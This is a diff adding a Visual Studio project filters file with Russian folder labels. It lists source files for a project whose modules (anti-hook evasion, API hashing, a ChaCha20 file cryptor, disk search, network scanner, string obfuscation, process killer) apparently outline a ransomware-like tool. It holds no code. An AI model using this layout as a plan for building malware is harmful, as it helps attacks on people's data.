@@ -1,0 +1,162 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Исходные файлы">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Файлы заголовков">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Файлы ресурсов">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="Исходные файлы\antihooks">
+      <UniqueIdentifier>{cd24065a-24af-4830-9574-70fe4f446264}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\api">
+      <UniqueIdentifier>{a70a10d3-62fd-4514-938d-0ceddb0c9d6c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\cryptor">
+      <UniqueIdentifier>{0017c2df-dc30-4f64-8e35-4e7972ee20ab}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\filesystem">
+      <UniqueIdentifier>{0abb98ab-53be-4848-b9fe-a638bb50e824}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\global">
+      <UniqueIdentifier>{f5658665-7b7e-49f1-aa77-1929f6d58d40}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\logs">
+      <UniqueIdentifier>{a77a01c6-bbf4-43f5-8e78-bf504984001b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\memory">
+      <UniqueIdentifier>{49f1e080-11c2-48a7-8a50-b817c6bef383}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\network_scanner">
+      <UniqueIdentifier>{14946c86-d5ac-4705-a4e5-968778f3cdb8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\obfuscation">
+      <UniqueIdentifier>{751341a5-2c8f-43e1-a2d6-36c6674d0d3e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\prockiller">
+      <UniqueIdentifier>{aefe40ae-20cf-49c3-a406-0d841a6e8049}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\threadpool">
+      <UniqueIdentifier>{7cf8a61d-4adf-496a-8ec0-ef623f78ee43}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Исходные файлы\cryptor\chacha20">
+      <UniqueIdentifier>{b9a379d5-4524-4cd7-afba-d95fcfbc0313}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="antihooks\antihooks.cpp">
+      <Filter>Исходные файлы\antihooks</Filter>
+    </ClCompile>
+    <ClCompile Include="api\getapi.cpp">
+      <Filter>Исходные файлы\api</Filter>
+    </ClCompile>
+    <ClCompile Include="api\hash.cpp">
+      <Filter>Исходные файлы\api</Filter>
+    </ClCompile>
+    <ClCompile Include="chacha20\chacha.c">
+      <Filter>Исходные файлы\cryptor\chacha20</Filter>
+    </ClCompile>
+    <ClCompile Include="cryptor.cpp">
+      <Filter>Исходные файлы\cryptor</Filter>
+    </ClCompile>
+    <ClCompile Include="filesystem\disks.cpp">
+      <Filter>Исходные файлы\filesystem</Filter>
+    </ClCompile>
+    <ClCompile Include="filesystem\search.cpp">
+      <Filter>Исходные файлы\filesystem</Filter>
+    </ClCompile>
+    <ClCompile Include="global\global_parameters.cpp">
+      <Filter>Исходные файлы\global</Filter>
+    </ClCompile>
+    <ClCompile Include="logs\logs.cpp">
+      <Filter>Исходные файлы\logs</Filter>
+    </ClCompile>
+    <ClCompile Include="memory.cpp">
+      <Filter>Исходные файлы\memory</Filter>
+    </ClCompile>
+    <ClCompile Include="network_scanner\network_scanner.cpp">
+      <Filter>Исходные файлы\network_scanner</Filter>
+    </ClCompile>
+    <ClCompile Include="threadpool\threadpool.cpp">
+      <Filter>Исходные файлы\threadpool</Filter>
+    </ClCompile>
+    <ClCompile Include="prockiller\prockiller.cpp">
+      <Filter>Исходные файлы\prockiller</Filter>
+    </ClCompile>
+    <ClCompile Include="main.cpp">
+      <Filter>Исходные файлы</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="antihooks\antihooks.h">
+      <Filter>Исходные файлы\antihooks</Filter>
+    </ClInclude>
+    <ClInclude Include="api\getapi.h">
+      <Filter>Исходные файлы\api</Filter>
+    </ClInclude>
+    <ClInclude Include="api\hash.h">
+      <Filter>Исходные файлы\api</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\chacha.h">
+      <Filter>Исходные файлы\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\ecrypt-config.h">
+      <Filter>Исходные файлы\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\ecrypt-machine.h">
+      <Filter>Исходные файлы\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\ecrypt-portable.h">
+      <Filter>Исходные файлы\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\ecrypt-sync.h">
+      <Filter>Исходные файлы\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="cryptor.h">
+      <Filter>Исходные файлы\cryptor</Filter>
+    </ClInclude>
+    <ClInclude Include="filesystem\filesystem.h">
+      <Filter>Исходные файлы\filesystem</Filter>
+    </ClInclude>
+    <ClInclude Include="global\global_parameters.h">
+      <Filter>Исходные файлы\global</Filter>
+    </ClInclude>
+    <ClInclude Include="logs\logs.h">
+      <Filter>Исходные файлы\logs</Filter>
+    </ClInclude>
+    <ClInclude Include="memory.h">
+      <Filter>Исходные файлы\memory</Filter>
+    </ClInclude>
+    <ClInclude Include="network_scanner\network_scanner.h">
+      <Filter>Исходные файлы\network_scanner</Filter>
+    </ClInclude>
+    <ClInclude Include="threadpool\threadpool.h">
+      <Filter>Исходные файлы\threadpool</Filter>
+    </ClInclude>
+    <ClInclude Include="prockiller\prockiller.h">
+      <Filter>Исходные файлы\prockiller</Filter>
+    </ClInclude>
+    <ClInclude Include="obfuscation\MetaRandom2.h">
+      <Filter>Исходные файлы\obfuscation</Filter>
+    </ClInclude>
+    <ClInclude Include="obfuscation\MetaString.h">
+      <Filter>Исходные файлы\obfuscation</Filter>
+    </ClInclude>
+    <ClInclude Include="common.h">
+      <Filter>Исходные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="mrph.h">
+      <Filter>Исходные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="queue.h">
+      <Filter>Исходные файлы</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
